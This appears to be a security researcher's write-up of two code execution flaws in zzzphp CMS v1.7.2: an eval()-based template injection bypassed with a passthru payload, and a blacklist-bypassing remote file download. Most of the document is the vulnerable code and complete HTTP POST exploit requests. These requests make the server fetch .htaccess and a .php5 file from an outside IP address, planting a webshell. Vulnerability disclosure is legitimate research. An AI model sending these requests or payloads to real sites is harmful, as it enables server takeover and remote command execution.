## zzzphp v1.7.2 Code excute 1

捡洞，原文来源于https://xz.aliyun.com/t/4471

原文版本为1.6.1，当前版本1.7.2在换了个poc之后依旧可以造成命令执行。

在inc/zzz_template.php第2343到2492行

```php
function parserIfLabel( $zcontent ) {
	$pattern = '/\{if:([\s\S]+?)}([\s\S]*?){end\s+if}/';
	if ( preg_match_all( $pattern, $zcontent, $matches ) ) {
		$count = count( $matches[ 0 ] );
		var_dump($count);
		for ( $i = 0; $i < $count; $i++ ) {
			$flag = '';
			$out_html = '';
			$ifstr = $matches[ 1 ][ $i ];
			// 危险关键字过滤
			$ifstr=danger_key($ifstr);
			$ifstr = str_replace( '=', '==', $ifstr );
			$ifstr = str_replace( '<>', '!=', $ifstr );
			$ifstr = str_replace( 'or', '||', $ifstr );
			$ifstr = str_replace( 'and', '&&', $ifstr );
			$ifstr = str_replace( 'mod', '%', $ifstr );
			//echop( $ifstr);
			@eval( 'if(' . $ifstr . '){$flag="if";}else{$flag="else";}' );
			if ( preg_match( '/([\s\S]*)?\{else\}([\s\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { // 判断是否存在else
				switch ( $flag ) {
					case 'if': // 条件为真
						if ( isset( $matches2[ 1 ] ) ) {
							$out_html .= $matches2[ 1 ];
						}
						break;
					case 'else': // 条件为假
						if ( isset( $matches2[ 2 ] ) ) {
							$out_html .= $matches2[ 2 ];
						}
						break;
				}
			} elseif ( $flag == 'if' ) {
				$out_html .= $matches[ 2 ][ $i ];
			}
			// 无限极嵌套解析
			$pattern2 = '/\{if([0-9]):/';
			if ( preg_match( $pattern2, $out_html, $matches3 ) ) {
				$out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html );
				$out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html );
				$out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html );
				$out_html = $this->parserIfLabel( $out_html );
			}
			// 执行替换
			$zcontent = str_replace( $matches[ 0 ][ $i ], $out_html, $zcontent );
		}
	}
	return $zcontent;
}
```

主要是去解析模板文件里的if语句，模板文件中是{if:a}{end:if}形式，需要解析为php语法。第2362行使用了eval函数，拼凑参数$ifstr，$ifstr是{if:a}里的a，同时$ifstr进行了黑名单替换，替换的关键字如下：

```php
$danger=array('php','preg','server','chr','decode','html','md5','post','get','cookie','session','sql','del','encrypt','upload','db','$','system','exec','shell','popen','eval');
$s = str_ireplace($danger,"*",$s);
```

POC使用`{if:passthru("whoami")}hacked{end if}`即可绕过检测，修改html和先知文章一样，最终利用：

![](https://s2.ax1x.com/2019/09/04/nVgB0s.png)

![](https://s2.ax1x.com/2019/09/04/nVgU1S.png)

![](https://s2.ax1x.com/2019/09/04/nVga6g.png)

## zzzphp v1.7.2 Code excute 2

inc/zzz_file.php

```php
function down_url( $url, $save_dir='file', $filename = '', $type = 0 ) {
	if ( is_null( $url ) ) return array( 'state' => '内容为空', 'dir' => '', 'url' => '', 'error' => 1 );
	// save_dir = zzzphp/upload/file/
	$save_dir = SITE_DIR.conf('uploadpath').$save_dir.'/';
	// 未指定filename参数，以url结尾保存文件
	if ( trim( $filename ) == '' ) { //保存文件名
		$filename = file_name( $url );
		$file_ext = file_ext( $url );
	}else{
		$file_ext = file_ext( $url );
	}
	if(in_array($file_ext,array('php','asp','aspx','exe','sh','sql','bat')) ||  empty($file_ext))  {
		return array( 'state' => '创建文件失败,禁止创建'.$file_ext.'文件！,' . $url, 'dir' => '', 'url' => '', 'error' => 5 );
	}
	//创建保存目录
	if ( !file_exists( $save_dir ) && !mkdir( $save_dir, 0777, true ) ) {
		return array( 'state' => '创建文件夹失败', 'dir' => '', 'url' => '', 'error' => 5 );
	}
	$file_dir = $save_dir . $filename;
	$file_path = str_replace( SITE_DIR, SITE_PATH, $file_dir );
	if ( file_exists( $file_dir ) )	del_file( $file_dir );
	//获取远程文件所采用的方法
	if ( $type ) {
		$ch = curl_init();
		$timeout = 5;
		curl_setopt( $ch, CURLOPT_URL, $url );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
		curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, $timeout );
		$img = curl_exec( $ch );
		curl_close( $ch );
	} else {
		ob_start();
		readfile( $url );
		$img = ob_get_contents();
		ob_end_clean();
	}
	$fp2 = @fopen( $file_dir, 'a' );
	fwrite( $fp2, $img );
	fclose( $fp2 );
	unset( $img, $url );
	return array('state'=> 'SUCCESS','title' => $filename, 'dir' => $file_dir, 'ext' => $file_ext, 'url' => $file_path, 'error' => 0 );
}
```

function down_url() will download file with the specified url. This made a blacklist limit, but it was easy to bypass. For example, we can use `php5` to bypass the check of php, and `htaccess` is not in the blacklist !

so we can upload a .htaccess file firstly and upload a php5 file.

The down_url() is used in the plugins/ueditor/php/controller.php:

```php
switch ($action) {
    ......
/* 抓取远程文件 */
    case 'catchimage':
		$source=getform('source','post');
		$list = array();
     	foreach ($source as $imgUrl) {
			$info =down_url(safe_url($imgUrl),$upfolder); 
			if ($info['state']=="SUCCESS"){
				array_push($list, array(			
					"state" => "SUCCESS",				
					"title" => $info["title"],
					"url" => $info["url"],
					"source"=>$imgUrl
				));
			}
		}
		$result =  json_encode(array(
			'state' => count($list) ? 'SUCCESS' : 'ERROR',
			'list' => $list
		));
        break;
```

Specify the `$action` parameter to enter this case. Pass the `source` parameter to specify the url.

Final Poc like this:

Download .htaccess

```
POST /zzzphp/plugins/ueditor/php/controller.php?upfolder=news&action=catchimage& HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/zzzphp/admin412/?content/cid=4
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

source[]=http://45.78.50.117:8000/.htaccess
```

Download s.php5

```
POST /zzzphp/plugins/ueditor/php/controller.php?upfolder=news&action=catchimage& HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/zzzphp/admin412/?content/cid=4
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

source[]=http://45.78.50.117:8000/s.php5
```

A gif:

![](https://s2.ax1x.com/2019/09/05/nmi8Ug.gif)

